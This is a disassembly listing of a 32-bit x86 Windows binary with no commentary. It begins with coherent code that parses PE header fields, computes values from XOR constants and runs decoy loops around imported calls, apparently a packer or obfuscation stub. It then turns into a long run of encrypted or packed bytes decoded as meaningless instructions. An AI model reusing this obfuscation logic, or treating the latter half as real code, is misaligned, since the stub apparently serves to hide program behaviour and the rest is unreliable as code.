  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42000b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d26c
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	(bad)  
  418114:	int    0x73
  418116:	xchg   edx,eax
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx+0x79]
  418120:	ja     0x4180ee
  418122:	lods   al,BYTE PTR ds:[esi]
  418123:	(bad)  
  418124:	and    bl,BYTE PTR [ebx]
  418126:	push   ebx
  418127:	dec    ebp
  418128:	cmp    al,BYTE PTR [eax+0x5f]
  41812b:	in     al,dx
  41812c:	iret   
  41812d:	xchg   DWORD PTR [edx+0x65],eax
  418130:	adc    esp,DWORD PTR [ecx]
  418132:	addr16 rol edi,0xcd
  418136:	js     0x41812a
  418138:	mov    ds:0xdedb97d7,eax
  41813d:	outs   dx,BYTE PTR ds:[esi]
  41813e:	sbb    eax,0x6e168950
  418143:	xchg   BYTE PTR ds:0xfc0ebe00,al
  418149:	mov    cl,0xb4
  41814b:	sbb    eax,ecx
  41814d:	test   BYTE PTR [ecx+0x50],bh
  418150:	dec    edx
  418151:	inc    edx
  418152:	popa   
  418153:	mov    cl,BYTE PTR [eax-0xe]
  418156:	xor    eax,0x43166d3c
  41815b:	mov    ?,ecx
  41815d:	push   ds
  41815e:	addr16 int 0xc4
  418161:	xor    DWORD PTR [ebp-0x6c3e2a86],edx
  418167:	jmp    0x4180f6
  418169:	in     eax,0xf0
  41816b:	(bad)  
  41816c:	dec    esi
  41816d:	inc    ebp
  41816e:	push   0x1c0c5982
  418173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418174:	inc    eax
  418175:	pop    edi
  418176:	inc    ebp
  418177:	cmc    
  418178:	out    0x3c,al
  41817a:	push   cs
  41817b:	inc    edi
  41817c:	outs   dx,DWORD PTR ds:[esi]
  41817d:	sbb    ah,BYTE PTR [edi]
  41817f:	scas   eax,DWORD PTR es:[edi]
  418180:	jl     0x418147
  418182:	rcr    DWORD PTR [ebp-0x1d],1
  418185:	dec    edx
  418186:	push   ebx
  418187:	mov    bl,0x88
  418189:	sti    
  41818a:	mov    esi,esi
  41818c:	sbb    eax,0x3e368afb
  418191:	jp     0x4181fa
  418193:	mov    bh,0x32
  418195:	xor    al,BYTE PTR [ebp+0x8]
  418198:	popa   
  418199:	stc    
  41819a:	add    bh,BYTE PTR [esi]
  41819c:	xor    dl,BYTE PTR [eax+0x4e869e45]
  4181a2:	rcr    DWORD PTR [ebx],0xdc
  4181a5:	sti    
  4181a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181a7:	shl    DWORD PTR [ebx+0x51e0dfea],0xbf
  4181ae:	sar    DWORD PTR [edi+0x30318bc0],cl
  4181b4:	xor    eax,0xf04d61b
  4181b9:	ja     0x418142
  4181bb:	mov    esi,0x973145f5
  4181c0:	and    eax,0x63138c38
  4181c5:	push   ecx
  4181c6:	mov    ebx,0x53e0d34
  4181cb:	hlt    
  4181cc:	ins    BYTE PTR es:[edi],dx
  4181cd:	jae    0x4181d1
  4181cf:	test   al,0xd3
  4181d1:	add    DWORD PTR [esi],ebp
  4181d3:	(bad)  
  4181d4:	xor    eax,0x741b8619
  4181d9:	scas   eax,DWORD PTR es:[edi]
  4181da:	inc    ecx
  4181db:	dec    eax
  4181dc:	fidiv  WORD PTR [eax-0x6b54039a]
  4181e2:	lahf   
  4181e3:	xchg   ebx,eax
  4181e4:	cmp    al,0x5f
  4181e6:	(bad)  
  4181e7:	mov    ebp,0x7a40c12d
  4181ec:	jl     0x4181ca
  4181ee:	jne    0x41822b
  4181f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f1:	pop    eax
  4181f2:	xchg   edx,eax
  4181f3:	adc    eax,0x34aac2ab
  4181f9:	sbb    BYTE PTR [ecx+0x64fc75c6],al
  4181ff:	adc    al,0x4
  418201:	mov    bl,0x1
  418203:	lahf   
  418204:	inc    eax
  418205:	dec    esi
  418206:	mul    esi
  418208:	adc    dl,0x63
  41820b:	xor    BYTE PTR [ebp+ecx*4+0x6e],al
  41820f:	mov    ah,BYTE PTR [ecx+0x77875731]
  418215:	cmp    al,0xfe
  418217:	(bad)  
  418218:	jae    0x4181e7
  41821a:	paddsw mm5,mm5
  41821d:	test   al,0xc2
  41821f:	inc    edx
  418220:	(bad)  
  418221:	xlat   BYTE PTR ds:[ebx]
  418222:	sbb    eax,0x3a7811ed
  418227:	in     al,dx
  418228:	into   
  418229:	sub    eax,0x51
  41822c:	or     BYTE PTR [eax],bl
  41822e:	dec    esp
  41822f:	arpl   WORD PTR [esi+0x6b],cx
  418232:	test   eax,0xca34b914
  418237:	iret   
  418238:	xchg   DWORD PTR [edi],ebp
  41823a:	call   ebx
  41823c:	sbb    eax,0x6d38206b
  418241:	push   ebp
  418242:	cli    
  418243:	xlat   BYTE PTR ds:[ebx]
  418244:	lea    edi,[edi+0x16]
  418247:	mov    dl,0xcd
  418249:	fst    QWORD PTR [edx-0x57]
  41824c:	cmp    bh,BYTE PTR [esi]
  41824e:	or     al,0xba
  418250:	push   0xffffff8e
  418252:	pusha  
  418253:	sub    DWORD PTR [ebp-0x42],esi
  418256:	push   0x6d
  418258:	out    0x89,eax
  41825a:	test   BYTE PTR [ebx-0x3c],ah
  41825d:	and    DWORD PTR [ebx],edi
  41825f:	rcl    BYTE PTR [ebx-0x1d],cl
  418262:	or     BYTE PTR [edx-0x7948a210],cl
  418268:	test   al,0xe8
  41826a:	gs mov eax,0xf8986b07
  418270:	xor    eax,DWORD PTR [edi]
  418272:	add    bl,bh
  418274:	enter  0x8da0,0xc0
  418278:	jp     0x41823d
  41827a:	sub    edi,DWORD PTR [esp+ebp*1+0x2c]
  41827e:	mov    cl,0xcf
  418280:	jp     0x4182f5
  418282:	or     esp,eax
  418284:	pop    esi
  418285:	push   ebx
  418286:	fs clc 
  418288:	test   ebp,ebx
  41828a:	leave  
  41828b:	out    0xb2,eax
  41828d:	sahf   
  41828e:	xchg   esp,eax
  41828f:	sub    bl,dh
  418291:	pushf  
  418292:	push   ds
  418293:	fs lock (bad) 
  418296:	mov    al,ds:0x1e7bfd5e
  41829b:	mov    ?,ebx
  41829d:	mov    al,0xbf
  41829f:	arpl   WORD PTR [edi-0x75],cx
  4182a2:	pop    edi
  4182a3:	mov    ?,WORD PTR [esi+edi*1]
  4182a6:	inc    edx
  4182a7:	add    eax,0xd13be554
  4182ac:	or     eax,0x7ec9abbc
  4182b1:	arpl   WORD PTR [eax+0x3a73dea0],bp
  4182b7:	les    ecx,FWORD PTR ds:0x8dd430be
  4182bd:	leave  
  4182be:	fs ret 0xb97c
  4182c2:	fcom   DWORD PTR [esi]
  4182c4:	add    bl,BYTE PTR [ebx+0x11]
  4182c7:	sub    al,0x36
  4182c9:	sub    al,0x3d
  4182cb:	sub    BYTE PTR [eax],dh
  4182cd:	inc    ebx
  4182ce:	imul   ebx,DWORD PTR [edx-0x31],0xffffff80
  4182d2:	adc    bh,BYTE PTR [ebp-0x2b2a6a9]
  4182d8:	jl     0x4182b9
  4182da:	or     eax,0x38813a3f
  4182df:	and    ch,BYTE PTR [eax-0x2c9d28a6]
  4182e5:	leave  
  4182e6:	pop    esp
  4182e7:	sub    ah,BYTE PTR [esp+ebx*4]
  4182ea:	nop
  4182eb:	data16 fwait
  4182ed:	shl    BYTE PTR [ecx],1
  4182ef:	fcom   st(5)
  4182f1:	and    dl,BYTE PTR [ecx+0x1e]
  4182f4:	mov    ecx,0x200504af
  4182f9:	sbb    ebp,DWORD PTR [edi+0x3d8683b5]
  4182ff:	add    eax,0x1cae0207
  418304:	repz and bh,BYTE PTR [esi-0x65cf7626]
  41830b:	shr    BYTE PTR [esp+ebp*4],cl
  41830e:	push   es
  41830f:	out    0xae,al
  418311:	test   BYTE PTR [esi+esi*2+0x46056aef],0x20
  418319:	dec    edx
  41831a:	cs inc ebp
  41831c:	mov    ah,0x0
  41831e:	sub    eax,0xccccaf20
  418323:	xchg   edx,eax
  418324:	jl     0x41839d
  418326:	out    dx,al
  418327:	add    bl,ah
  418329:	mov    edi,0xfbb31c8a
  41832e:	mov    bh,0x9c
  418330:	les    eax,FWORD PTR [eax+edi*8+0x3c]
  418334:	ins    DWORD PTR es:[edi],dx
  418335:	cli    
  418336:	xchg   ebp,eax
  418337:	fnstcw WORD PTR [esi+0x797f5835]
  41833d:	loope  0x418331
  41833f:	(bad)  
  418340:	dec    edx
  418341:	push   0x54
  418343:	xlat   BYTE PTR ds:[ebx]
  418344:	popf   
  418345:	cmp    ch,BYTE PTR [esi+0x25be770b]
  41834b:	add    eax,0xe208a1a7
  418350:	jo     0x418310
  418352:	(bad)  
  418353:	xor    DWORD PTR [esi+0x24],ecx
  418356:	or     DWORD PTR [ebp+0x4fb7a431],0x59ceaa73
  418360:	add    al,0xca
  418362:	cdq    
  418363:	push   ecx
  418364:	(bad)  
  418366:	ins    DWORD PTR es:[edi],dx
  418367:	push   es
  418368:	xchg   BYTE PTR [edx],bh
  41836a:	push   esi
  41836b:	pop    edx
  41836c:	dec    edi
  41836d:	adc    DWORD PTR [esi],0x20
  418370:	xchg   ebp,eax
  418371:	jge    0x41830d
  418373:	stos   BYTE PTR es:[edi],al
  418374:	lahf   
  418375:	and    ebp,DWORD PTR [ebp-0x6accc131]
  41837b:	leave  
  41837c:	scas   eax,DWORD PTR es:[edi]
  41837d:	jb     0x4183a9
  41837f:	mov    BYTE PTR [esp+eiz*4+0x36],dh
  418383:	scas   eax,DWORD PTR es:[edi]
  418384:	sbb    al,0xf3
  418386:	sub    BYTE PTR [ebp+ebx*1-0x4ce2651],0x77
  41838e:	xor    BYTE PTR [esi],ah
  418390:	fidiv  WORD PTR [eax+0x63]
  418393:	je     0x418323
  418395:	cwde   
  418396:	outs   dx,DWORD PTR ds:[esi]
  418397:	enter  0xc7c9,0x62
  41839b:	xor    al,0xc
  41839d:	push   esp
  41839e:	(bad)
  4183a1:	repnz mov ecx,0x9544a646
  4183a7:	div    DWORD PTR [edi+0x66]
  4183aa:	mov    eax,0x7fcf4dd1
  4183af:	dec    ebx
  4183b0:	imul   ebp,DWORD PTR [ecx],0xffffffe2
  4183b3:	pop    ds
  4183b4:	lods   al,BYTE PTR ds:[esi]
  4183b5:	sub    esp,DWORD PTR [eax+0x423f7a02]
  4183bb:	aaa    
  4183bc:	fwait
  4183bd:	and    esp,edx
  4183bf:	aas    
  4183c0:	xor    DWORD PTR [ebx],ebx
  4183c2:	loope  0x4183ed
  4183c4:	test   DWORD PTR [edi-0x71],0x3ea85604
  4183cb:	mov    WORD PTR [esi-0x46748fa1],?
  4183d1:	adc    BYTE PTR [edx-0x33],dl
  4183d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d5:	sub    al,0xf6
  4183d7:	rcl    DWORD PTR [ecx+ebp*4-0x62f35896],1
  4183de:	int    0x83
  4183e0:	inc    esi
  4183e1:	and    ah,ch
  4183e3:	mov    BYTE PTR [ecx+ebx*8],dl
  4183e6:	pop    ds
  4183e7:	test   BYTE PTR [edi],ah
  4183e9:	int    0x15
  4183eb:	fs mov eax,0x9f1312fd
  4183f1:	(bad)  
  4183f2:	mov    DWORD PTR [ebp+0x6e176b4d],ebx
  4183f8:	dec    ecx
  4183f9:	sahf   
  4183fa:	inc    eax
  4183fb:	xchg   DWORD PTR [ebp-0x24],ebp
  4183fe:	retf   0x442b
  418401:	jnp    0x41847b
  418403:	mov    bl,0xc0
  418405:	pushf  
  418406:	jmp    0x3b36:0x1600ddbe
  41840d:	cmp    al,0xd7
  41840f:	outs   dx,DWORD PTR ds:[esi]
  418410:	test   eax,0xc383a546
  418415:	es add ebp,edx
  418418:	jmp    0x6cb01be4
  41841d:	add    BYTE PTR [edx+0x1e],cl
  418420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418421:	dec    ebx
  418422:	sub    eax,0xe684fb7f
  418427:	sub    eax,ebx
  418429:	setno  BYTE PTR [ebp+edx*1-0x4112eae5]
  418431:	mov    ecx,DWORD PTR ds:0x30307dc6
  418437:	imul   edx,esp,0xffffff92
  41843a:	ins    DWORD PTR es:[edi],dx
  41843b:	add    eax,0x3073e295
  418440:	add    al,0x6a
  418442:	mov    eax,ds:0xe0b53341
  418447:	or     BYTE PTR [ebp+0x53546618],cl
  41844d:	add    eax,0x23a36888
  418452:	outs   dx,BYTE PTR ds:[esi]
  418453:	jle    0x418454
  418455:	sub    eax,DWORD PTR [ebx]
  418457:	stos   DWORD PTR es:[edi],eax
  418458:	mov    esi,0x2d6715eb
  41845d:	es pop es
  41845f:	xchg   edi,eax
  418460:	xchg   ecx,eax
  418461:	mov    BYTE PTR [edx-0xa867fd6],dl
  418467:	stc    
  418468:	pushf  
  418469:	jb     0x41840f
  41846b:	(bad)  
  41846c:	bound  esp,QWORD PTR [esp+eax*2-0x55]
  418470:	sub    dh,BYTE PTR [esp+edi*1-0x3c]
  418474:	test   cl,0xf2
  418477:	test   al,0xfa
  418479:	cmp    ebp,DWORD PTR [eax-0x51]
  41847c:	fcmovne st,st(7)
  41847e:	das    
  41847f:	pusha  
  418480:	dec    eax
  418481:	ficom  DWORD PTR [ecx+esi*2+0x55]
  418485:	imul   edi,DWORD PTR [esi+0x3b118f52],0x1cc8c063
  41848f:	dec    ebp
  418490:	pop    esp
  418491:	xor    esp,DWORD PTR [ebp-0x47]
  418494:	push   edx
  418495:	xchg   esp,eax
  418496:	push   edi
  418497:	pop    esi
  418498:	jmp    0x3337:0xc778b85b
  41849f:	cmp    bl,ch
  4184a1:	mov    ch,0x1a
  4184a3:	pusha  
  4184a4:	sbb    DWORD PTR [ebp+0x326ba714],0xffffff8e
  4184ab:	xor    BYTE PTR [edi],cl
  4184ad:	lahf   
  4184ae:	jb     0x418495
  4184b0:	pop    eax
  4184b1:	sbb    DWORD PTR [esi-0x21],eax
  4184b4:	jae    0x418436
  4184b6:	cmp    dl,BYTE PTR [edx]
  4184b8:	mov    ecx,0xb18bbcc2
  4184bd:	jb     0x4184d2
  4184bf:	jmp    0x4dcb5d6a
  4184c4:	sbb    bh,BYTE PTR [eax+0x60]
  4184c7:	xor    eax,esp
  4184c9:	(bad)  
  4184ca:	retf   
  4184cb:	fisubr DWORD PTR [eax+0x2d]
  4184ce:	sub    BYTE PTR ds:0x5416b9,bh
  4184d4:	lods   al,BYTE PTR ds:[esi]
  4184d5:	int    0x14
  4184d7:	add    ah,cl
  4184d9:	addr16 out dx,eax
  4184db:	push   esi
  4184dc:	push   edx
  4184dd:	stos   BYTE PTR es:[edi],al
  4184de:	les    ebx,FWORD PTR [ebp+0x5a]
  4184e1:	mov    ds:0x41210f31,al
  4184e6:	icebp  
  4184e7:	imul   edx,DWORD PTR ds:0x45398d4c,0x19686977
  4184f1:	pop    ebx
  4184f2:	inc    esi
  4184f3:	xchg   ecx,eax
  4184f4:	test   eax,0x3d5459d9
  4184f9:	jns    0x4184f7
  4184fb:	cli    
  4184fc:	(bad)  
  4184fd:	repnz xor BYTE PTR [edx+0x23],bh
  418501:	sahf   
  418502:	ret    0x3936
  418505:	mov    al,BYTE PTR [esi+0x1ef4249f]
  41850b:	leave  
  41850c:	mov    cl,0x68
  41850e:	inc    dx
  418510:	out    0xc4,eax
  418512:	add    al,0x6f
  418514:	push   es
  418515:	pusha  
  418516:	mov    dh,0x1b
  418518:	pop    eax
  418519:	rol    BYTE PTR [edx-0x26],1
  41851c:	xor    DWORD PTR [ebx],esp
  41851e:	xchg   edi,eax
  41851f:	mov    dh,0x75
  418521:	and    al,0x37
  418523:	cmp    eax,0xb8c0959f
  418528:	gs and al,0xd1
  41852b:	or     BYTE PTR [ecx-0x4c],dl
  41852e:	push   cs
  41852f:	xchg   ecx,eax
  418530:	xchg   ebp,eax
  418531:	iret   
  418532:	je     0x4184ff
  418534:	or     di,si
  418537:	sbb    ecx,DWORD PTR [ebp+0x5b]
  41853a:	loope  0x4184d1
  41853c:	xchg   edi,eax
  41853d:	adc    DWORD PTR ss:[eax+0x403fc4e4],ebx
  418544:	int    0xa7
  418546:	bound  esi,QWORD PTR [eax]
  418548:	and    BYTE PTR [edi+0x1d],dl
  41854b:	jbe    0x4185a8
  41854d:	loope  0x41859a
  41854f:	or     BYTE PTR [ecx-0x4cab4d20],bl
  418555:	scas   al,BYTE PTR es:[edi]
  418556:	fisttp QWORD PTR [ebx-0x2a]
  418559:	cwde   
  41855a:	fist   DWORD PTR [ebx]
  41855c:	add    BYTE PTR [esi],al
  41855e:	sbb    ah,bh
  418560:	or     DWORD PTR [ebx+0x3f],edi
  418563:	ja     0x4185cb
  418565:	rcr    DWORD PTR [edx+0x76],0x90
  418569:	jge    0x4185c7
  41856b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41856c:	aam    0xd4
  41856e:	jno    0x4185d9
  418570:	in     al,0xae
  418572:	fsub   DWORD PTR [ebx+0x73d3052c]
  418578:	es mov dh,0xf3
  41857b:	mov    al,ds:0x3bbca70
  418580:	retf   0x3c71
  418583:	test   edx,eax
  418585:	cmp    DWORD PTR [eax+0x47],edx
  418588:	or     al,0x18
  41858a:	fwait
  41858b:	aam    0x80
  41858d:	push   edx
  41858e:	pop    esi
  41858f:	dec    ebx
  418590:	sub    al,0x58
  418592:	imul   ebp,DWORD PTR [eax-0x2a],0xec2ee94c
  418599:	imul   esp,DWORD PTR [edi-0x3855b4ed],0x29
  4185a0:	mov    ax,ds:0x4b5296af
  4185a6:	mov    esi,0xa442acb2
  4185ab:	es push eax
  4185ad:	cwde   
  4185ae:	xchg   edx,eax
  4185af:	and    esp,DWORD PTR [edi]
  4185b1:	ret    
  4185b2:	(bad)
  4185b5:	jmp    0x418602
  4185b7:	push   ecx
  4185b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185b9:	lds    ecx,FWORD PTR [eax-0x722762e6]
  4185bf:	rcr    DWORD PTR [ecx+0x4cf54233],cl
  4185c5:	jb     0x4185d6
  4185c7:	cmp    eax,0x4aa33482
  4185cc:	mov    eax,ds:0xb61afebe
  4185d1:	(bad)  
  4185d2:	dec    esp
  4185d3:	push   0xeb9e7c2a
  4185d8:	(bad)  
  4185da:	pop    eax
  4185db:	retf   
  4185dc:	out    dx,eax
  4185dd:	cdq    
  4185de:	xlat   BYTE PTR ds:[ebx]
  4185df:	nop
  4185e0:	jle    0x4185fb
  4185e2:	dec    ebp
  4185e3:	stc    
  4185e4:	pop    esp
  4185e5:	std    
  4185e6:	adc    DWORD PTR [esp+eax*1-0x3d1e7a2c],0xffffff98
  4185ee:	or     eax,0xe5e460e9
  4185f3:	push   ds
  4185f4:	sbb    BYTE PTR [ebp+esi*2-0x1c64059d],al
  4185fb:	jmp    0x8e0e2e6d
  418600:	sti    
  418601:	jle    0x4185f6
  418603:	inc    ebx
  418604:	sar    DWORD PTR [eax+0x50d7f08c],1
  41860a:	icebp  
  41860b:	mov    al,0x7
  41860d:	mov    ah,0x73
  41860f:	ss (bad) 
  418611:	loopne 0x4185ec
  418613:	sbb    edi,edi
  418615:	fcom   DWORD PTR [edi+0x2d]
  418618:	data16 mov al,ds:0xfb0b2978
  41861e:	mov    al,BYTE PTR [edx-0x34d36d9a]
  418624:	jmp    0x4186a1
  418626:	outs   dx,DWORD PTR ds:[esi]
  418627:	add    BYTE PTR [edx-0x14855f83],dl
  41862d:	push   esi
  41862e:	sub    edx,DWORD PTR [esi+0x39]
  418631:	pushf  
  418632:	sub    esp,DWORD PTR [eax-0x258930b1]
  418638:	mov    BYTE PTR [eax+0x1a97e2ad],ah
  41863e:	push   0xffffffb6
  418640:	mov    ds:0xc2a8e92b,al
  418645:	ins    BYTE PTR es:[edi],dx
  418646:	ja     0x41860b
  418648:	xchg   esi,eax
  418649:	(bad)  
  41864b:	call   FWORD PTR [ebx]
  41864d:	mov    esi,0x8485fd49
  418652:	cmp    DWORD PTR [ecx+eax*8],eax
  418655:	mov    dh,0x26
  418657:	ret    
  418658:	xchg   ecx,eax
  418659:	fistp  DWORD PTR [esi*1-0x3144c2f6]
  418660:	les    edx,FWORD PTR [ecx+0x37f2c7a3]
  418666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418667:	mov    ds,WORD PTR [ebx+0xc]
  41866a:	pop    ds
  41866b:	popf   
  41866c:	xchg   ecx,eax
  41866d:	add    ecx,DWORD PTR [ebp+0x3fc7635f]
  418673:	stos   DWORD PTR es:[edi],eax
  418674:	mov    dl,0x5c
  418676:	clc    
  418677:	fisubr DWORD PTR [esi+0x142d52c7]
  41867d:	popa   
  41867e:	xor    al,0x40
  418680:	pop    ebx
  418681:	test   cl,0xe8
  418684:	shl    BYTE PTR [ecx],1
  418686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418687:	jnp    0x4186ea
  418689:	pop    ecx
  41868a:	int3   
  41868b:	xchg   BYTE PTR [eax+0x33564383],bh
  418691:	xor    DWORD PTR [ecx],ebx
  418693:	jbe    0x4186e7
  418695:	in     eax,dx
  418696:	ret    0x693b
  418699:	stos   BYTE PTR es:[edi],al
  41869a:	xlat   BYTE PTR ds:[ebx]
  41869b:	cwde   
  41869c:	or     eax,0xf12627e5
  4186a1:	test   al,0x81
  4186a3:	mov    ecx,DWORD PTR [ebp+0x4f]
  4186a6:	fcomp  st(6)
  4186a8:	mov    ecx,0x3e81193d
  4186ad:	mov    edx,0x8e7a6294
  4186b2:	mov    ebp,?
  4186b4:	mov    ebp,0xfe83fe50
  4186b9:	mov    ?,WORD PTR [edx+0x31]
  4186bc:	fild   WORD PTR [edx-0x5b]
  4186bf:	dec    ecx
  4186c0:	xchg   edi,eax
  4186c1:	sbb    eax,0xb87ae1b2
  4186c6:	dec    esi
  4186c7:	adc    eax,0x2d458796
  4186cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186cd:	adc    al,0xa4
  4186cf:	dec    ebp
  4186d0:	or     dl,cl
  4186d2:	ror    ebx,0xf6
  4186d5:	in     al,0xdb
  4186d7:	dec    ebx
  4186d8:	inc    esp
  4186d9:	cmp    DWORD PTR [ebp+0x26e08d3d],0xffffffc5
  4186e0:	push   0xf31895fd
  4186e5:	pusha  
  4186e6:	retf   
  4186e7:	mov    esp,ebp
  4186e9:	xchg   ebx,eax
  4186ea:	push   ecx
  4186eb:	or     eax,0x53857205
  4186f0:	mov    al,0xab
  4186f2:	jb     0x4186ec
  4186f4:	inc    ebp
  4186f5:	arpl   WORD PTR [edx+0xf],sp
  4186f8:	xchg   BYTE PTR [eax-0x4b9bf501],ch
  4186fe:	push   esp
  4186ff:	fild   QWORD PTR [eax-0x44f4fcba]
  418705:	or     ah,BYTE PTR [ebx]
  418707:	push   0xffffffd1
  418709:	xor    al,0xd3
  41870b:	les    eax,FWORD PTR [edi-0x77c02175]
  418711:	call   0x82db:0xf9f1f114
  418718:	adc    eax,DWORD PTR [ebp-0x4f]
  41871b:	in     al,dx
  41871c:	das    
  41871d:	mov    ebx,0xe56a634e
  418722:	xchg   edx,eax
  418723:	sub    dl,bl
  418725:	jns    0x418730
  418727:	dec    ecx
  418728:	push   ds
  418729:	inc    esi
  41872a:	icebp  
  41872b:	ret    
  41872c:	les    edx,FWORD PTR [edx]
  41872e:	dec    eax
  41872f:	jns    0x418776
  418731:	nop
  418732:	repnz xchg esp,eax
  418734:	jb     0x41878d
  418736:	lock sbb al,0x9b
  418739:	mov    gs,WORD PTR [esi+0x66]
  41873c:	or     bl,dh
  41873e:	mov    ch,0x26
  418740:	adc    esp,DWORD PTR [eax-0x30a46ef7]
  418746:	nop
  418747:	in     al,dx
  418748:	das    
  418749:	sar    eax,0x2e
  41874c:	sbb    BYTE PTR [eax],bl
  41874e:	mov    eax,ds:0xeb141e6c
  418753:	mov    eax,ds:0x9e9a48cc
  418758:	ja     0x4187ae
  41875a:	mov    edx,0x71dbc71e
  41875f:	sub    al,0x34
  418761:	push   0xfffffff5
  418763:	xor    ebp,DWORD PTR [edi]
  418765:	lahf   
  418766:	fwait
  418767:	ins    DWORD PTR es:[edi],dx
  418768:	nop
  418769:	inc    ebx
  41876a:	pop    esi
  41876b:	xor    esp,ebx
  41876d:	nop
  41876e:	outs   dx,DWORD PTR ds:[esi]
  41876f:	push   es
  418770:	jno    0x418733
  418772:	xor    dl,BYTE PTR [edx]
  418774:	mov    esi,0x4b76d003
  418779:	push   eax
  41877a:	ins    DWORD PTR es:[edi],dx
  41877b:	imul   ebx,DWORD PTR [ebx+ebp*1+0x5c],0x89a07a3b
  418783:	mov    esp,0x37dc11f8
  418788:	mov    edi,0xef03cf07
  41878d:	in     al,0x95
  41878f:	jecxz  0x4187d9
  418791:	mov    edx,0x82768479
  418796:	sbb    BYTE PTR [ebx-0x69],0x4d
  41879a:	xchg   ecx,eax
  41879b:	and    eax,0x726d236d
  4187a0:	and    dh,BYTE PTR [ebp+0x49e46c83]
  4187a6:	jae    0x41872e
  4187a8:	loopne 0x4187a3
  4187aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187ab:	xlat   BYTE PTR ds:[ebx]
  4187ac:	push   ebp
  4187ad:	loop   0x41879c
  4187af:	nop
  4187b0:	jmp    0xd05d:0x23019495
  4187b7:	mov    dh,0x40
  4187b9:	jbe    0x41878e
  4187bb:	sbb    edi,DWORD PTR [edx]
  4187bd:	mov    BYTE PTR [edx+0x136ed0b8],dh
  4187c3:	inc    edx
